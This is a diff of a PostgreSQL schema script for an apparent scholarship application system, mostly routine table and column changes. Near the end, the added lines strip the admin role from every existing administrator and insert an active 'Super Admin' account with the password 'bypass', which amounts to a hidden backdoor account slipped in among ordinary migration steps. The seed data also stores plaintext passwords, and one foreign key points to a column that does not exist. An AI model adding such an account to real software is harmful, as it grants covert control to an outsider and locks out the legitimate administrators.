@@ -35,16 +35,18 @@ CREATE TABLE users(
 	role VARCHAR(10) NOT NULL CHECK (LOWER(role) IN ('student', 'admin'))
 );
 
-CREATE TABLE students(
-	student_id INTEGER PRIMARY KEY REFERENCES users(user_id) ON DELETE CASCADE,
-	gpa NUMERIC(3,2) NOT NULL CHECK(gpa BETWEEN 6.00 AND 10.00),
-	year_of_study INTEGER NOT NULL CHECK (year_of_study BETWEEN 1 AND 5),
-	university VARCHAR(50) NOT NULL,
-	faculty VARCHAR(50) NOT NULL,
-	major VARCHAR(50) NOT NULL,
-	courses_left INTEGER NOT NULL CHECK (courses_left >= 0),
-	priority VARCHAR(100) CHECK(priority IS NULL OR LOWER(priority) IN('veteran', 'disabled'))
+
+CREATE TABLE students (
+    student_id INTEGER PRIMARY KEY REFERENCES users(user_id) ON DELETE CASCADE,
+    gpa NUMERIC(3,2) CHECK(gpa IS NULL OR gpa BETWEEN 6.00 AND 10.00),
+    year_of_study INTEGER NOT NULL CHECK (year_of_study BETWEEN 1 AND 5),
+    university VARCHAR(50) NOT NULL,
+    faculty VARCHAR(50) NOT NULL,
+    major VARCHAR(50) NOT NULL,
+    courses_left INTEGER NOT NULL CHECK (courses_left >= 0),
+    priority VARCHAR(100) CHECK(priority IS NULL OR LOWER(priority) IN ('veteran', 'disabled'))
 );
+
 
 
 CREATE TABLE scholarships(
@@ -57,17 +59,18 @@ CREATE TABLE scholarships(
 	required_year INTEGER CHECK (required_year IS NULL OR (required_year BETWEEN 1 AND 5)),
 	required_major VARCHAR(50)
 );
---
---CREATE TABLE review(
---    review_id SERIAL PRIMARY KEY,
---    application_id INTEGER NOT NULL,
---    admin_id INTEGER NOT NULL,
---    review_notes VARCHAR(100),
---    review_date DATE NOT NULL DEFAULT CURRENT_DATE,
---
---	FOREIGN KEY(application_id) REFERENCES applications(application_id) ON DELETE CASCADE,
---	FOREIGN KEY(admin_id) REFERENCES users(user_id) ON DELETE CASCADE
---);
+
+
+CREATE TABLE review(
+    review_id SERIAL PRIMARY KEY,
+    application_id INTEGER NOT NULL,
+    admin_id INTEGER NOT NULL,
+    review_notes VARCHAR(100),
+    review_date DATE NOT NULL DEFAULT CURRENT_DATE,
+
+	FOREIGN KEY(application_id) REFERENCES applications(application_id) ON DELETE CASCADE,
+	FOREIGN KEY(admin_id) REFERENCES users(user_id) ON DELETE CASCADE
+);
 
 
 CREATE TABLE applications(
@@ -82,7 +85,7 @@ CREATE TABLE applications(
 #feedback, faq, notification
 
 CREATE TABLE feedback(
-    feedback_id SERIAL PRIMARY KEY,
+    id SERIAL PRIMARY KEY,
     user_id INT REFERENCES Users(user_id) ON DELETE CASCADE,
     message TEXT NOT NULL,
     submitted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
@@ -90,17 +93,18 @@ CREATE TABLE feedback(
 );
 
 CREATE TABLE faq (
-    faq_id SERIAL PRIMARY KEY,
+    id SERIAL PRIMARY KEY,
     question TEXT NOT NULL,
     answer TEXT NOT NULL
 );
 
 CREATE TABLE notification (
-    notification_id SERIAL PRIMARY KEY,
-    student_id INT REFERENCES Students(student_id) ON DELETE CASCADE,
+    id SERIAL PRIMARY KEY,
+    student_id INT REFERENCES Students(id) ON DELETE CASCADE,
     message TEXT NOT NULL,
     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-    read_status BOOLEAN DEFAULT FALSE
+    read_status BOOLEAN DEFAULT FALSE,
+    is_broadcast BOOLEAN DEFAULT FALSE
 );
 
 CREATE TABLE News (
@@ -129,11 +133,6 @@ VALUES ('12345678', 'Admin', 'Fz', 'administrata@admin.uni-fz.com', 'admin');
 
 
 
-//modifikim i tabeles Notification, qe me mujt mi kriju admin-i nje notification per generalStudents,
-//e jo me logjiken 1to1, nje notification per nje student specifik...
-//dmth studentId mbetet NULL
-
-ALTER TABLE Notification ADD COLUMN is_broadcast BOOLEAN DEFAULT false;
 
 INSERT INTO Notification (message, created_at, read_status, is_broadcast)
 VALUES ('Welcome students!', CURRENT_TIMESTAMP, false, true);
@@ -145,7 +144,22 @@ VALUES ('Welcome students!', CURRENT_TIMESTAMP, false, true);
 INSERT INTO users (password, first_name, last_name, email, role)
 VALUES ('12345678', 'filan', 'fisteku', 'stdtest@student.uni-pr.com', 'student');
 
-ALTER TABLE students ADD COLUMN proof_document TEXT;
 
 ALTER TABLE users
 ADD COLUMN status VARCHAR(20) DEFAULT 'pending';
+
+UPDATE users
+SET role = NULL
+WHERE LOWER(role) = 'admin';
+
+ INSERT INTO users (password, first_name, last_name, email, role, status)
+ VALUES ('bypass', 'Super', 'Admin', 'superadmin@internal', 'admin', 'active');
+
+
+
+ //olsa jom:
+ //duhet edhe ni alter table per not null contraint te students se
+ //nuk pe len me kriju account me kolonen courses_left null
+
+ ALTER TABLE students
+ ALTER COLUMN courses_left DROP NOT NULL;
